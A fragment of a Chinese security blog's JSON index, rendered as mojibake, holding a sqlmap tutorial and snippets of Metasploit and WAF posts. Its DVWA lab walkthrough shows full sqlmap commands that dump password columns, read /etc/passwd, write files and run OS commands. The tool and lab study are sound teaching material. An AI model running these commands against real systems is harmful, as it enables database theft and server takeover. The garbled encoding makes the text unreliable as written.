ORè¯­å¥çš„SQLæ³¨å…¥æµ‹è¯•ã€‚\nåœ¨æœ‰äº›æ—¶å€™ï¼Œä¾‹å¦‚åœ¨UPDATE/DELETEçš„è¯­å¥ä¸­ï¼Œæ³¨å…¥ä¸€ä¸ªORçš„æµ‹è¯•è¯­å¥ï¼Œå¯èƒ½å¯¼è‡´æ›´æ–°çš„æ•´ä¸ªè¡¨ï¼Œå¯èƒ½é€ æˆå¾ˆå¤§çš„é£é™©ã€‚\næµ‹è¯•çš„è¯­å¥åŒæ ·å¯ä»¥åœ¨xml/payloads.xmlä¸­æ‰¾åˆ°ï¼Œä½ ä¹Ÿå¯ä»¥è‡ªè¡Œæ·»åŠ payloadã€‚\n3.6 Enumerationï¼šæšä¸¾æ•°æ® -a, --all è·å–æ‰€æœ‰ä¿¡æ¯ -b, --banner è·å–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯† --current-user è·å–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ· --current-db è·å–æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“ --hostname è·å–æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåç§° --is-dba æ£€æµ‹DBMSå½“å‰ç”¨æˆ·æ˜¯å¦DBAï¼ˆæ•°æ®åº“ç®¡ç†å‘˜ï¼‰ --users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ· --passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ --privileges æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™ --roles æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰² --dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“ --tables æšä¸¾çš„DBMSæ•°æ®åº“ä¸­çš„è¡¨ --columns æšä¸¾DBMSæ•°æ®åº“è¡¨åˆ— --schema æšä¸¾æ•°æ®åº“æ¶æ„ --count æ£€ç´¢è¡¨çš„é¡¹ç›®æ•° --dump è½¬å‚¨æ•°æ®åº“è¡¨é¡¹ï¼Œå³ä¸‹è½½ --dump-all è½¬å‚¨æ•°æ®åº“æ‰€æœ‰è¡¨é¡¹ --search æœç´¢åˆ—ï¼ˆSï¼‰ï¼Œè¡¨ï¼ˆSï¼‰å’Œ/æˆ–æ•°æ®åº“åç§°ï¼ˆSï¼‰ --comments è·å–DBMSæ³¨é‡Š -D DB è¦è¿›è¡Œæšä¸¾çš„æŒ‡å®šæ•°æ®åº“å -T TBL DBMSæ•°æ®åº“è¡¨æšä¸¾ -C COL DBMSæ•°æ®åº“è¡¨åˆ—æšä¸¾ -X EXCLUDECOL DBMSæ•°æ®åº“è¡¨ä¸è¿›è¡Œæšä¸¾ -U USER ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ· --exclude-sysdbs æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“ --pivot-column=P.. Pivot columnname --where=DUMPWHERE Use WHEREcondition while table dumping --start=LIMITSTART è·å–ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºæ•°æ®ä½ç½® --stop=LIMITSTOP è·å–æœ€åæŸ¥è¯¢çš„è¾“å‡ºæ•°æ® --first=FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦è·å– --last=LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦è·å– --sql-query=QUERY è¦æ‰§è¡Œçš„SQLè¯­å¥ --sql-shell æç¤ºäº¤äº’å¼SQLçš„shell --sql-file=SQLFILE è¦æ‰§è¡Œçš„SQLæ–‡ä»¶ æ ‡å¿— å‚æ•°ï¼š-b,\u0026ndash;banner å¤§å¤šæ•°çš„æ•°æ®åº“ç³»ç»Ÿéƒ½æœ‰ä¸€ä¸ªå‡½æ•°å¯ä»¥è¿”å›æ•°æ®åº“çš„ç‰ˆæœ¬å·ï¼Œé€šå¸¸è¿™ä¸ªå‡½æ•°æ˜¯version()æˆ–è€…å˜é‡ @@versionï¼Œè¿™ä¸»è¦å–å†³äºæ˜¯ä»€ä¹ˆæ•°æ®åº“ã€‚\nå½“å‰ç”¨æˆ· å‚æ•°ï¼š-current-user åœ¨å¤§å¤šæ•°æ®åº“ä¸­å¯ä»¥è·å–åˆ°ç®¡ç†æ•°æ®çš„ç”¨æˆ·ã€‚\nå½“å‰æ•°æ®åº“ å‚æ•°ï¼š\u0026ndash;current-db è¿”è¿˜å½“å‰è¿æ¥çš„æ•°æ®åº“ã€‚\nå½“å‰ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ å‚æ•°ï¼š\u0026ndash;is-dba åˆ¤æ–­å½“å‰çš„ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜ï¼Œæ˜¯çš„è¯ä¼šè¿”å›Trueã€‚\nåˆ—å‡ºæ•°æ®åº“ç®¡ç†ç”¨æˆ·\nå‚æ•°ï¼š\u0026ndash;users\nå½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨çš„æƒé™æ—¶ï¼Œå°±å¯ä»¥åˆ—å‡ºæ‰€æœ‰ç®¡ç†ç”¨æˆ·ã€‚\nåˆ—å‡ºå¹¶ç ´è§£æ•°æ®åº“ç”¨æˆ·çš„hash å‚æ•°ï¼š\u0026ndash;passwords å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«ç”¨æˆ·å¯†ç çš„è¡¨çš„æƒé™æ—¶ï¼Œsqlmapä¼šç°åˆ—ä¸¾å‡ºç”¨æˆ·ï¼Œç„¶ååˆ—å‡ºhashï¼Œå¹¶å°è¯•ç ´è§£ã€‚\npython sqlmap.py -u \u0026#34;http://magedu/sqlmap/pgsql/students.php?id=1\u0026#34; --passwords - v1 åˆ—å‡ºæ•°æ®åº“ç®¡ç†å‘˜æƒé™ å‚æ•°ï¼š\u0026ndash;privileges å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨çš„æƒé™æ—¶ï¼Œå¾ˆå¯èƒ½åˆ—ä¸¾å‡ºæ¯ä¸ªç”¨æˆ·çš„æƒé™ï¼Œsqlmapå°†ä¼šå‘Šè¯‰ä½  å“ªä¸ªæ˜¯æ•°æ®åº“çš„è¶…çº§ç®¡ç†å‘˜ã€‚ä¹Ÿå¯ä»¥ç”¨-Uå‚æ•°æŒ‡å®šä½ æƒ³çœ‹å“ªä¸ªç”¨æˆ·çš„æƒé™ã€‚\nåˆ—å‡ºæ•°æ®åº“ç®¡ç†å‘˜è§’è‰² å‚æ•°ï¼š\u0026ndash;roles å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨çš„æƒé™æ—¶ï¼Œå¾ˆå¯èƒ½åˆ—ä¸¾å‡ºæ¯ä¸ªç”¨æˆ·çš„è§’è‰²ï¼Œä¹Ÿå¯ä»¥ç”¨-Uå‚æ•°æŒ‡å®šä½ æƒ³çœ‹å“ªä¸ªç”¨æˆ·çš„è§’è‰²ã€‚ä»…é€‚ç”¨äºå½“å‰æ•°æ®åº“æ˜¯Oracleçš„æ—¶å€™ã€‚\nåˆ—å‡ºæ•°æ®åº“ç³»ç»Ÿçš„æ•°æ®åº“ å‚æ•°ï¼š\u0026ndash;dbs å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰æ•°æ®åº“åˆ—è¡¨ä¿¡æ¯çš„è¡¨ä¸­çš„æ—¶å€™ï¼Œå³å¯åˆ—å‡ºæ‰€æœ‰çš„æ•°æ®åº“ã€‚\nåˆ—ä¸¾æ•°æ®åº“è¡¨ å‚æ•°ï¼š\u0026ndash;tables,\u0026ndash;exclude-sysdbs,-D å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰æ•°æ®åº“è¡¨ä¿¡æ¯çš„è¡¨ä¸­çš„æ—¶å€™ï¼Œå³å¯åˆ—å‡ºä¸€ä¸ªç‰¹å®šæ•°æ®çš„æ‰€æœ‰è¡¨ã€‚ å¦‚æœä½ ä¸æä¾›-Då‚æ•°æ¥æŒ‡å®šä¸€ä¸ªæ•°æ®åº“çš„æ—¶å€™ï¼Œsqlmapä¼šåˆ—å‡ºæ•°æ®åº“æ‰€æœ‰åº“çš„æ‰€æœ‰è¡¨ã€‚ \u0026ndash;exclude-sysdbså‚æ•°æ˜¯æŒ‡å¯æ’é™¤ç³»ç»Ÿæ•°æ®åº“ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯åœ¨Oracleä¸­ä½ éœ€è¦æä¾›çš„æ˜¯TABLESPACE_NAMEè€Œä¸æ˜¯æ•°æ®åº“åç§°ã€‚\nåˆ—ä¸¾æ•°æ®åº“è¡¨ä¸­çš„å­—æ®µ å‚æ•°ï¼š\u0026ndash;columns,-C,-T,-D å½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰æ•°æ®åº“è¡¨ä¿¡æ¯çš„è¡¨ä¸­çš„æ—¶å€™ï¼Œå³å¯åˆ—å‡ºæŒ‡å®šæ•°æ®åº“è¡¨ä¸­çš„å­—æ®µï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ—å‡ºå­—æ®µçš„æ•°æ®ç±»å‹ã€‚ å¦‚æœæ²¡æœ‰ä½¿ç”¨-Då‚æ•°æŒ‡å®šæ•°æ®åº“æ—¶ï¼Œé»˜è®¤ä¼šä½¿ç”¨å½“å‰æ•°æ®åº“ã€‚\n3.7 Brute forceï¼šçˆ†ç ´ --common-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨ --common-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ— User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰ï¼š --udf-inject æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° --shared-lib=SHLIB å…±äº«åº“çš„æœ¬åœ°è·¯å¾„ 3.8 File system accessï¼šè®¿é—®æ–‡ä»¶ç³»ç»Ÿ --file-read=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿè¯»å–æ–‡ä»¶ --file-write=WFILE ä¸Šä¼ æ–‡ä»¶åˆ°åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ --file-dest=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ ä»æ•°æ®åº“æœåŠ¡å™¨ä¸­è¯»å–æ–‡ä»¶ å‚æ•°ï¼š\u0026ndash;file-read å½“æ•°æ®åº“ä¸ºMySQLï¼ŒPostgreSQLæˆ–Microsoft SQL Serverï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·æœ‰æƒé™ä½¿ç”¨ç‰¹å®šçš„å‡½æ•°ã€‚è¯»å–çš„æ–‡ä»¶å¯ä»¥æ˜¯æ–‡æœ¬ä¹Ÿå¯ä»¥æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\npython sqlmap.py -u \u0026#34;http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\u0026#34; -p id --file-read \u0026#34;/etc/passwd\u0026#34; **æŠŠæ–‡ä»¶ä¸Šä¼ åˆ°æ•°æ®åº“æœåŠ¡å™¨ä¸­ **\nå‚æ•°ï¼š\u0026ndash;file-write,\u0026ndash;file-dest å½“æ•°æ®åº“ä¸ºMySQLï¼ŒPostgreSQLæˆ–Microsoft SQL Serverï¼Œå¹¶ä¸”å½“å‰ç”¨æˆ·æœ‰æƒé™ä½¿ç”¨ç‰¹å®šçš„å‡½æ•°ã€‚ä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æ–‡æœ¬ä¹Ÿå¯ä»¥æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚\npython sqlmap.py -u \u0026#34;http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\u0026#34; -p id python sqlmap.py -u \u0026#34;http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\u0026#34; -p id --file-write=\u0026#34;/opt/test_code/user.txt\u0026#34; --filedest=\u0026#34;/var/www/html/user.txt\u0026#34; 3.9 Operating system accessï¼šè®¿é—®æ“ä½œç³»ç»Ÿ --os-cmd=OSCMD æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ --os-shell äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„shell --os-pwn è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC --os-smbrelay ä¸€é”®è·å–ä¸€ä¸ªOOB shellï¼Œmeterpreteræˆ–VNC --os-bof å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨ --priv-esc æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡ --msf-path=MSFPATH Metasploit Framework æœ¬åœ°çš„å®‰è£…è·¯å¾„ --tmp-path=TMPPATH è¿œç¨‹ä¸´æ—¶æ–‡ä»¶ç›®å½•çš„ç»å¯¹è·¯å¾„ è·å–æ•´ä¸ªè¡¨çš„æ•°æ® å‚æ•°ï¼š\u0026ndash;dump,-C,-T,-D,\u0026ndash;start,\u0026ndash;stop,\u0026ndash;first,\u0026ndash;last å¦‚æœå½“å‰ç®¡ç†å‘˜æœ‰æƒé™è¯»å–æ•°æ®åº“å…¶ä¸­çš„ä¸€ä¸ªè¡¨çš„è¯ï¼Œé‚£ä¹ˆå°±èƒ½è·å–æ•´ä¸ªè¡¨çš„æ‰€æœ‰å†…å®¹ã€‚ ä½¿ç”¨-D,-Tå‚æ•°æŒ‡å®šæƒ³è¦è·å–å“ªä¸ªåº“çš„å“ªä¸ªè¡¨ï¼Œä¸ä½¿ç”¨-Då‚æ•°æ—¶ï¼Œé»˜è®¤ä½¿ç”¨å½“å‰åº“ã€‚\npython sqlmap.py -u \u0026#34;http://magedu/sqlmap/firebird/students.php?id=1\u0026#34; --dump -T users å¯ä»¥è·å–æŒ‡å®šåº“ä¸­çš„æ‰€æœ‰è¡¨çš„å†…å®¹ï¼Œåªç”¨-dumpè·Ÿ-Då‚æ•°ï¼ˆä¸ä½¿ç”¨-Tä¸-Cå‚æ•°ï¼‰ã€‚ä¹Ÿå¯ä»¥ç”¨-dumpè·Ÿ-Cè·å–æŒ‡å®šçš„å­—æ®µå†…å®¹ã€‚\nsqlmapä¸ºæ¯ä¸ªè¡¨ç”Ÿæˆäº†ä¸€ä¸ªCSVæ–‡ä»¶ã€‚\nå¦‚æœä½ åªæƒ³è·å–ä¸€æ®µæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨\u0026ndash;startå’Œ\u0026ndash;stopå‚æ•°ï¼Œä¾‹å¦‚ï¼Œä½ åªæƒ³è·å–ç¬¬ä¸€æ®µæ•°æ®å¯ä»¥ä½¿ç”¨\u0026ndash;stop1ï¼Œå¦‚æœæƒ³è·å–ç¬¬äºŒæ®µä¸ç¬¬ä¸‰æ®µæ•°æ®ï¼Œä½¿ç”¨å‚æ•° \u0026ndash;start 1 \u0026ndash;stop 3ã€‚ ä¹Ÿå¯ä»¥ç”¨\u0026ndash;firstä¸\u0026ndash;lastå‚æ•°ï¼Œè·å–ç¬¬å‡ ä¸ªå­—ç¬¦åˆ°ç¬¬å‡ ä¸ªå­—ç¬¦çš„å†…å®¹ï¼Œå¦‚æœä½ æƒ³è·å–å­—æ®µä¸­ç¬¬ä¸‰ä¸ªå­—ç¬¦åˆ°ç¬¬äº”ä¸ªå­—ç¬¦çš„å†…å®¹ï¼Œä½¿ç”¨\u0026ndash;first 3 \u0026ndash;last 5ï¼Œåªåœ¨ç›²æ³¨çš„æ—¶å€™ä½¿ç”¨ï¼Œå› ä¸ºå…¶ä»–æ–¹å¼å¯ä»¥å‡†ç¡®çš„è·å–æ³¨å…¥å†…å®¹ï¼Œä¸éœ€è¦ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦çš„çŒœè§£ã€‚\nè·å–æ‰€æœ‰æ•°æ®åº“è¡¨çš„å†…å®¹ å‚æ•°ï¼š\u0026ndash;dump-all,\u0026ndash;exclude-sysdbs ä½¿ç”¨\u0026ndash;dump-allå‚æ•°è·å–æ‰€æœ‰æ•°æ®åº“è¡¨çš„å†…å®¹ï¼Œå¯åŒæ—¶åŠ ä¸Š\u0026ndash;exclude-sysdbsæ’é™¤ç³»ç»Ÿæ•°æ®åº“ï¼Œåªè·å–ç”¨æˆ·æ•°æ®åº“çš„è¡¨ï¼Œå³ä¸šåŠ¡æ•°æ®ã€‚\næœç´¢å­—æ®µï¼Œè¡¨ï¼Œæ•°æ®åº“ å‚æ•°ï¼š\u0026ndash;search,-C,-T,-D \u0026ndash;searchå¯ä»¥ç”¨æ¥å¯»æ‰¾ç‰¹å®šçš„æ•°æ®åº“åï¼Œæ‰€æœ‰æ•°æ®åº“ä¸­çš„ç‰¹å®šè¡¨åï¼Œæ‰€æœ‰æ•°æ®åº“è¡¨ä¸­çš„ç‰¹å®šå­—æ®µã€‚ å¯ä»¥åœ¨ä»¥ä¸‹ä¸‰ç§æƒ…å†µä¸‹ä½¿ç”¨ï¼š\n-Cåè·Ÿç€ç”¨é€—å·åˆ†å‰²çš„åˆ—åï¼Œå°†ä¼šåœ¨æ‰€æœ‰æ•°æ®åº“è¡¨ä¸­æœç´¢æŒ‡å®šçš„åˆ—åã€‚ -Tåè·Ÿç€ç”¨é€—å·åˆ†å‰²çš„è¡¨åï¼Œå°†ä¼šåœ¨æ‰€æœ‰æ•°æ®åº“ä¸­æœç´¢æŒ‡å®šçš„è¡¨å -Dåè·Ÿç€ç”¨é€—å·åˆ†å‰²çš„åº“åï¼Œå°†ä¼šåœ¨æ‰€æœ‰æ•°æ®åº“ä¸­æœç´¢æŒ‡å®šçš„åº“åã€‚ è¿è¡Œè‡ªå®šä¹‰çš„SQLè¯­å¥ å‚æ•°ï¼š\u0026ndash;sql-query,\u0026ndash;sql-shell sqlmapä¼šè‡ªåŠ¨æ£€æµ‹ç¡®å®šä½¿ç”¨å“ªç§SQLæ³¨å…¥æŠ€æœ¯ï¼Œå¦‚ä½•æ’å…¥æ£€ç´¢è¯­å¥ã€‚ å¦‚æœæ˜¯SELECTæŸ¥è¯¢è¯­å¥ï¼Œsqlmapå°†ä¼šè¾“å‡ºç»“æœã€‚å¦‚æœæ˜¯é€šè¿‡SQLæ³¨å…¥æ‰§è¡Œå…¶ä»–è¯­å¥ï¼Œéœ€è¦æµ‹è¯•æ˜¯å¦æ”¯æŒå¤šè¯­å¥æ‰§è¡ŒSQLè¯­å¥ã€‚\n$python sqlmap.py -u \u0026#34;http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026amp;Submit=Submit#\u0026#34; --sql-query \u0026#34;SELECT \u0026#39;magedu\u0026#39;\u0026#34; -v1 è¿è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ å‚æ•°ï¼š\u0026ndash;os-cmd,\u0026ndash;os-shell\npython sqlmap.py -u \u0026#34;127.0.0.1:8080/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; - -cookie=\u0026#34;PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\u0026#34; -p id --os-cmd id ç”¨\u0026ndash;os-shellå‚æ•°ä¹Ÿå¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªçœŸå®çš„shellï¼Œå¯ä»¥è¾“å…¥ä½ æƒ³æ‰§è¡Œçš„å‘½ä»¤ã€‚ å½“ä¸èƒ½æ‰§è¡Œå¤šè¯­å¥çš„æ—¶å€™ï¼ˆæ¯”å¦‚phpæˆ–è€…aspçš„åç«¯æ•°æ®åº“ä¸ºMySQLæ—¶ï¼‰ï¼Œä»ç„¶å¯èƒ½ä½¿ç”¨INTO OUTFILEå†™è¿›å¯å†™ç›®å½•ï¼Œæ¥åˆ›å»ºä¸€ä¸ªwebåé—¨ã€‚æ”¯æŒçš„è¯­è¨€ï¼š\n1ã€ASP 2ã€ASP.NET 3ã€JSP 4ã€PHP çˆ¬è¡Œç½‘ç«™URL å‚æ•°ï¼š\u0026ndash;crawl sqlmapå¯ä»¥æ”¶é›†æ½œåœ¨çš„å¯èƒ½å­˜åœ¨æ¼æ´çš„è¿æ¥ï¼Œåé¢è·Ÿçš„å‚æ•°æ˜¯çˆ¬è¡Œçš„æ·±åº¦ã€‚æ­¤æ—¶çš„URLå¯ä»¥ä¸å¸¦å‚æ•°ã€‚\npython sqlmap.py -u \u0026#34;http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026amp;Submit=Submit#\u0026#34; --batch --crawl=3 python sqlmap.py -u \u0026#34;http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026amp;Submit=Submit#\u0026#34; --batch --crawl=3 å®šä¹‰dumpæ•°æ®çš„æ ¼å¼ å‚æ•°ï¼š\u0026ndash;dump-format è¾“å‡ºçš„æ ¼å¼å¯å®šä¹‰ä¸ºï¼šCSVï¼ŒHTMLï¼ŒSQLITE\nè‡ªå®šä¹‰è¾“å‡ºçš„è·¯å¾„ å‚æ•°ï¼š\u0026ndash;output-dir sqlmapé»˜è®¤æŠŠsessionæ–‡ä»¶è·Ÿç»“æœæ–‡ä»¶ä¿å­˜åœ¨outputæ–‡ä»¶å¤¹ä¸‹ï¼Œç”¨æ­¤å‚æ•°å¯è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„ ä¾‹å¦‚ï¼š\u0026ndash;output-dir=/tmp\n4 å®é™…åˆ©ç”¨(dvwa) å½“ç»™sqlmapè¿™ä¹ˆä¸€ä¸ªurlçš„æ—¶å€™ï¼Œå®ƒä¼šï¼š\n1ã€åˆ¤æ–­å¯æ³¨å…¥çš„å‚æ•° 2ã€åˆ¤æ–­å¯ä»¥ç”¨é‚£ç§SQLæ³¨å…¥æŠ€æœ¯æ¥æ³¨å…¥ 3ã€è¯†åˆ«å‡ºå“ªç§æ•°æ®åº“ 4ã€æ ¹æ®ç”¨æˆ·é€‰æ‹©ï¼Œè¯»å–å“ªäº›æ•°æ® å¦‚æœä½ æƒ³è§‚å¯Ÿsqlmapå¯¹ä¸€ä¸ªç‚¹æ˜¯è¿›è¡Œäº†æ€æ ·çš„å°è¯•åˆ¤æ–­ä»¥åŠè¯»å–æ•°æ®çš„ï¼Œå¯ä»¥ä½¿ç”¨-vå‚æ•°\n0ã€åªæ˜¾ç¤ºpythoné”™è¯¯ä»¥åŠä¸¥é‡çš„ä¿¡æ¯ã€‚ 1ã€åŒæ—¶æ˜¾ç¤ºåŸºæœ¬ä¿¡æ¯å’Œè­¦å‘Šä¿¡æ¯ã€‚ï¼ˆé»˜è®¤ï¼‰ 2ã€åŒæ—¶æ˜¾ç¤ºdebugä¿¡æ¯ã€‚ 3ã€åŒæ—¶æ˜¾ç¤ºæ³¨å…¥çš„payloadã€‚ 4ã€åŒæ—¶æ˜¾ç¤ºHTTPè¯·æ±‚ã€‚ 5ã€åŒæ—¶æ˜¾ç¤ºHTTPå“åº”å¤´ã€‚ 6ã€åŒæ—¶æ˜¾ç¤ºHTTPå“åº”é¡µé¢ã€‚ å¦‚æœä½ æƒ³çœ‹åˆ°sqlmapå‘é€çš„æµ‹è¯•payloadæœ€å¥½çš„ç­‰çº§å°±æ˜¯3ã€‚\n# åˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œå› ç³»ç»Ÿéœ€è¦ç™»å½•æ‰€ä»¥è¦åŠ  cookie python sqlmap.py -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\u0026#34; -p id --batch # æ£€æµ‹ç«™ç‚¹åŒ…å«å“ªäº›æ•°æ®åº“ python sqlmap.py -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\u0026#34; -p id --dbs --batch æŠ€å·§ï¼šåœ¨å®é™…æ£€æµ‹è¿‡ç¨‹ä¸­ï¼Œsqlmapä¼šä¸åœçš„è¯¢é—®ï¼Œéœ€è¦æ‰‹å·¥è¾“å…¥Y/Næ¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨å‚æ•°â€œ\u0026ndash;batchâ€å‘½ä»¤æ¥è‡ªåŠ¨ç­”å¤å’Œåˆ¤æ–­\nå¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªæ•°æ®åº“ï¼Œé€‰æ‹©dvwaæ•°æ®åº“è·å–å…¶ä¸­çš„è¡¨å\npython sqlmap.py -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\u0026#34; -D dvwa --tables --batch å¯ä»¥çœ‹åˆ°ï¼Œdvwaé‡Œé¢æœ‰ä¸¤å¼ è¡¨ï¼Œåˆ†åˆ«æ˜¯guestbookï¼Œusersã€‚é€‰æ‹©usersè¡¨è·å–è¡¨ä¸­çš„å­—æ®µ\npython sqlmap.py -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\u0026#34; -D dvwa -T users --columns å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰passwordï¼Œç›´æ¥è·å–æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ (è´¦å·/å¯†ç )\npython sqlmap.py -u \u0026#34;http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\u0026#34; -D dvwa -T users -C last_name,password --dump --batch ","permalink":"https://senmer.github.io/zh/posts/tech/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/","summary":"","title":"SQLmapå®‰è£…å’Œä½¿ç”¨"},{"content":"ï¼ˆ1ï¼‰MS08-067ã€MS10-018ã€MS17-010ã€CVE-2018-4878æ¼æ´å¤ç°\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP msf kaliè‡ªå¸¦ 172.31.5.9 window xp professional VMvare workstation 16 172.31.5.41 2 MS08-067 MS08-067æ¼æ´å°†ä¼šå½±å“Windows 2000/XP/Server 2003/Vista/Server 2008çš„å„ä¸ªç‰ˆæœ¬ï¼Œç”šè‡³è¿˜åŒ…æ‹¬æµ‹è¯•é˜¶æ®µçš„Windows 7 Pro-Betaã€‚\nå¦‚æœç”¨æˆ·åœ¨å—å½±å“çš„ç³»ç»Ÿä¸Šæ”¶åˆ°ç‰¹åˆ¶çš„ RPC è¯·æ±‚ï¼Œåˆ™è¯¥æ¼æ´å¯èƒ½å…è®¸è¿œç¨‹æ‰§è¡Œä»£ç ã€‚ åœ¨ Microsoft Windows 2000ã€Windows XP å’Œ Windows Server 2003 ç³»ç»Ÿä¸Šï¼Œæ”»å‡»è€…å¯èƒ½æœªç»èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´è¿è¡Œä»»æ„ä»£ç ã€‚æ­¤æ¼æ´å¯èƒ½ç”¨äºè¿›è¡Œè •è™«æ”»å‡»ã€‚é˜²ç«å¢™æœ€ä½³åšæ³•å’Œæ ‡å‡†çš„é»˜è®¤é˜²ç«å¢™é…ç½®æœ‰åŠ©äºä¿æŠ¤ç½‘ç»œèµ„æºå…å—ä»ä¼ä¸šå¤–éƒ¨å‘èµ·çš„æ”»å‡»ã€‚\n","permalink":"https://senmer.github.io/zh/posts/tech/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","summary":"\u003cp\u003eï¼ˆ1ï¼‰MS08-067ã€MS10-018ã€MS17-010ã€CVE-2018-4878æ¼æ´å¤ç°\u003c/p\u003e","title":"MSFæ¼æ´åˆ©ç”¨"},{"content":"ï¼ˆ1ï¼‰å®ç°WAFå®‰è£…ä¸é…ç½®\nï¼ˆ2ï¼‰åˆ†åˆ«åœ¨æ— 